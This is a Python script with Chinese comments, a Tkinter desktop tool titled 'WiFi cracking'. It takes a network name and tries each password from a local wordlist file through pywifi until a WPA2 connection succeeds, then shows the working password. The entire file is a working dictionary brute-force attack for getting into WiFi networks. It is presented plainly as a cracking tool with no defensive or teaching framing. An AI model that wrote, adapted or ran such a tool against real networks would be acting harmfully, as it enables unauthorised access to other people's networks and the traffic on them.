# ! /usr/bin/env python
# - * - coding:utf-8 - * -
# __author__ : KingWolf
# createtime : 2018/7/31 4:07

'''
    1.读取密码本
    2.测试连接
    3.睡眠时间
    4.返回正确的密码
'''

from tkinter import *
from tkinter import messagebox    #消息提示
import pywifi
from pywifi import const    #常量
import time

#测试连接
def wificonnect(password,wifiname):    #需要接收密码的参数
    wifi = pywifi.PyWiFi()   #创建一个无线网卡的对象
    ifaces = wifi.interfaces()[0]   #抓取第一个网口

    #断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    #需要测试是否断开成功,通过判断状态来确定
    if ifaces.status() == const.IFACE_DISCONNECTED:
        #创建WiFi连接文件
        profile = pywifi.Profile()
        #要连接的WiFi名称
        profile.ssid = wifiname    #HUAWEI-MA2GE7
        #WiFi密码
        profile.key = password

        #接下来的是一些常量，记住就行
        profile.auth = const.AUTH_ALG_OPEN   #网卡的开放
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  #无线网卡的加密方式
        profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元，不是必须加的

        #删除所有的WiFi文件，方便下次新创建WiFi连接文件
        ifaces.remove_all_network_profiles()

        #设定新的连接文件
        temp_profile = ifaces.add_network_profile(profile)
        #连接新的WiFi
        ifaces.connect(temp_profile)
        time.sleep(5)   #重新连接需要时间
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False

        # print("连接不成功")
    else:
        print("连接成功")

# wificonnect()
# exit()

#读取密码本
def readPassWord():
    print("---破解开始---")
    wifiname = entry.get()
    # 密码本的路径
    path = r'F:\local_repository\Spider-learn\new-spider-and-python\wifi-password.txt'
    #只读模式
    file = open(path,'r')
    while True:        #需要写一个死循环去读取所有的密码
        #捕获异常
        try:
            #读取文件的方式，一行一行的读取
            pwd = file.readline()
            # print(pwd)
            pwdstr = wificonnect(pwd,wifiname)     #测试连接的函数,传一个密码的参数
            if pwdstr:
                # print("密码正确",pwd)
                messagebox.showinfo("密码正确",pwd)  #只让密码显示在TK中，不显示在控制台那里
                #跳出死循环
                break
            else:
                text.insert(END,"密码错误:"+pwd)   #在尾部不断添加错误的密码
                text.see(END)       #不断的向下滚动
                text.update()       #不断的更新
                # print("密码错误",pwd)
        except:
            #跳出当前循环，继续进行
            continue
# readPassWord()
# exit()

#tkinter桌面显示

#创建窗口
root = Tk()    #root是一个对象

#窗口标题
root.title("wifi破解")

#窗口大小   500*400,但是在TK中，用的是小写的x
root.geometry('500x380')

#窗口位置
root.geometry('+500+250')  #用“+”号来确定窗口显示的位置

# #窗口大小和窗口位置可以同时设置
# root.geometry('500x400+500+250')

#标签控件
label = Label(root,text= "请输入需要破解的WiFi名称：")

#定位，网格式布局 package place
label.grid(row = 0,column = 0)  #这里定位的是默认值，第0行，第0列

#输入控件
entry = Entry(root,font= ("微软雅黑",20))
entry.grid(row = 0,column = 1)   #这里定位，调整一下默认位置

#列表框控件
text = Listbox(root,font = ("微软雅黑",15),width = 40,height = 10)    #设置列表框的字体，宽高
#columnspan组件所跨越的列数(跨列的场景)
text.grid(row = 1,columnspan = 2)

#按钮
button = Button(root,text = "开始破解",width = 10,height = 2,command = readPassWord) #这里的点击按钮，需要触发读取密码本的函数
button.grid(row = 2,columnspan = 2)   #这个按钮也是属于跨列的

#显示窗口(消息循环)
root.mainloop()

#多线程
